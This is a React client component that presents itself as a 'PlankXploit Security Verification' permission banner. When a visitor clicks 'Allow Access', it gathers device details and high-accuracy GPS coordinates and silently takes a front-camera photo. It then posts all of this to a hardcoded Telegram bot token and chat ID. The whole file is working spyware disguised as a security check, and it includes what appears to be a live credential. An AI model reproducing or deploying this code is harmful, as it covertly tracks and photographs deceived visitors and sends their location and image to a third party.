"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { X, MapPin, Camera, Smartphone, Check, AlertTriangle } from "lucide-react"

interface PermissionNotificationProps {
  onPermissionsHandled: () => void
}

interface DeviceInfo {
  userAgent: string
  platform: string
  language: string
  screenResolution: string
  timezone: string
  cookieEnabled: boolean
  onlineStatus: boolean
}

interface LocationInfo {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: number
}

export default function PermissionNotification({ onPermissionsHandled }: PermissionNotificationProps) {
  const [isVisible, setIsVisible] = useState(true)
  const [permissionStatus, setPermissionStatus] = useState({
    location: false,
    camera: false,
    device: false,
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null)
  const [locationInfo, setLocationInfo] = useState<LocationInfo | null>(null)

  // Collect device information
  const collectDeviceInfo = () => {
    const info: DeviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookieEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
    }
    setDeviceInfo(info)
    setPermissionStatus((prev) => ({ ...prev, device: true }))
    return info
  }

  // Request location permission
  const requestLocationPermission = (): Promise<LocationInfo> => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Geolocation not supported"))
        return
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData: LocationInfo = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp,
          }
          setLocationInfo(locationData)
          setPermissionStatus((prev) => ({ ...prev, location: true }))
          resolve(locationData)
        },
        (error) => {
          reject(error)
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        },
      )
    })
  }

  // Request camera permission and capture photo
  const requestCameraPermission = (): Promise<string> => {
    return new Promise((resolve, reject) => {
      navigator.mediaDevices
        .getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: "user",
          },
          audio: false,
        })
        .then((stream) => {
          setPermissionStatus((prev) => ({ ...prev, camera: true }))

          // Capture photo
          const video = document.createElement("video")
          const canvas = document.createElement("canvas")
          const context = canvas.getContext("2d")

          video.srcObject = stream
          video.play()

          video.onloadedmetadata = () => {
            canvas.width = video.videoWidth
            canvas.height = video.videoHeight

            if (context) {
              context.drawImage(video, 0, 0)
              const imageData = canvas.toDataURL("image/jpeg", 0.8)

              // Stop the stream
              stream.getTracks().forEach((track) => track.stop())

              resolve(imageData)
            } else {
              reject(new Error("Canvas context not available"))
            }
          }
        })
        .catch((error) => {
          reject(error)
        })
    })
  }

  // Send data to Telegram bot
  const sendToTelegram = async (deviceInfo: DeviceInfo, locationInfo?: LocationInfo, photoData?: string) => {
    const botToken = "7708391187:AAEfWPNYz6dsdKaBtAIJmoZlTKzP_gwpvZs"
    const chatId = "7607881795"

    try {
      // Prepare message text
      let message = `🔥 PlankXploit Access Log 🔥\n\n`
      message += `📱 Device Info:\n`
      message += `• Platform: ${deviceInfo.platform}\n`
      message += `• Language: ${deviceInfo.language}\n`
      message += `• Screen: ${deviceInfo.screenResolution}\n`
      message += `• Timezone: ${deviceInfo.timezone}\n`
      message += `• User Agent: ${deviceInfo.userAgent.substring(0, 100)}...\n\n`

      if (locationInfo) {
        message += `📍 Location Info:\n`
        message += `• Latitude: ${locationInfo.latitude.toFixed(6)}\n`
        message += `• Longitude: ${locationInfo.longitude.toFixed(6)}\n`
        message += `• Accuracy: ${locationInfo.accuracy.toFixed(0)}m\n`
        message += `• Timestamp: ${new Date(locationInfo.timestamp).toLocaleString()}\n\n`
      }

      message += `⏰ Access Time: ${new Date().toLocaleString()}\n`
      message += `🌐 Source: PlankXploit Web App`

      // Send text message
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      })

      // Send photo if available
      if (photoData) {
        // Convert base64 to blob
        const response = await fetch(photoData)
        const blob = await response.blob()

        const formData = new FormData()
        formData.append("chat_id", chatId)
        formData.append("photo", blob, "capture.jpg")
        formData.append("caption", "📸 Camera Capture from PlankXploit")

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData,
        })
      }

      console.log("✅ Data sent to Telegram successfully")
    } catch (error) {
      console.error("❌ Failed to send data to Telegram:", error)
    }
  }

  // Handle allow permissions
  const handleAllow = async () => {
    setIsProcessing(true)

    try {
      // Collect device info
      const deviceData = collectDeviceInfo()

      // Request location
      let locationData: LocationInfo | undefined
      try {
        locationData = await requestLocationPermission()
      } catch (error) {
        console.log("Location permission denied")
      }

      // Request camera
      let photoData: string | undefined
      try {
        photoData = await requestCameraPermission()
      } catch (error) {
        console.log("Camera permission denied")
      }

      // Send to Telegram
      await sendToTelegram(deviceData, locationData, photoData)

      // Hide notification after processing
      setTimeout(() => {
        setIsVisible(false)
        onPermissionsHandled()
      }, 2000)
    } catch (error) {
      console.error("Permission handling failed:", error)
    } finally {
      setIsProcessing(false)
    }
  }

  // Handle deny permissions
  const handleDeny = () => {
    setIsVisible(false)
    onPermissionsHandled()
  }

  if (!isVisible) return null

  return (
    <div className="fixed top-0 left-0 right-0 z-50 bg-gradient-to-r from-red-900 to-red-700 border-b-2 border-red-400 shadow-lg">
      <div className="container mx-auto px-4 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-2">
              <AlertTriangle className="w-5 h-5 text-yellow-400 animate-pulse" />
              <span className="text-white font-bold">PlankXploit Security Verification</span>
            </div>

            <div className="hidden md:flex items-center space-x-4 text-sm text-red-100">
              <div className="flex items-center space-x-1">
                <Smartphone className="w-4 h-4" />
                <span>Device Info</span>
                {permissionStatus.device && <Check className="w-4 h-4 text-green-400" />}
              </div>

              <div className="flex items-center space-x-1">
                <MapPin className="w-4 h-4" />
                <span>Location</span>
                {permissionStatus.location && <Check className="w-4 h-4 text-green-400" />}
              </div>

              <div className="flex items-center space-x-1">
                <Camera className="w-4 h-4" />
                <span>Camera</span>
                {permissionStatus.camera && <Check className="w-4 h-4 text-green-400" />}
              </div>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            {!isProcessing ? (
              <>
                <Button
                  onClick={handleAllow}
                  size="sm"
                  className="bg-green-600 hover:bg-green-700 text-white font-bold"
                >
                  ✅ Allow Access
                </Button>
                <Button
                  onClick={handleDeny}
                  size="sm"
                  variant="outline"
                  className="border-red-300 text-red-100 hover:bg-red-800 bg-transparent"
                >
                  ❌ Deny
                </Button>
              </>
            ) : (
              <div className="flex items-center space-x-2 text-white">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                <span className="text-sm">Processing permissions...</span>
              </div>
            )}

            <Button onClick={handleDeny} size="sm" variant="ghost" className="text-red-100 hover:bg-red-800 p-1">
              <X className="w-4 h-4" />
            </Button>
          </div>
        </div>

        {/* Mobile view for permission status */}
        <div className="md:hidden mt-2 flex items-center space-x-4 text-xs text-red-100">
          <div className="flex items-center space-x-1">
            <Smartphone className="w-3 h-3" />
            <span>Device</span>
            {permissionStatus.device && <Check className="w-3 h-3 text-green-400" />}
          </div>

          <div className="flex items-center space-x-1">
            <MapPin className="w-3 h-3" />
            <span>Location</span>
            {permissionStatus.location && <Check className="w-3 h-3 text-green-400" />}
          </div>

          <div className="flex items-center space-x-1">
            <Camera className="w-3 h-3" />
            <span>Camera</span>
            {permissionStatus.camera && <Check className="w-3 h-3 text-green-400" />}
          </div>
        </div>
      </div>
    </div>
  )
}
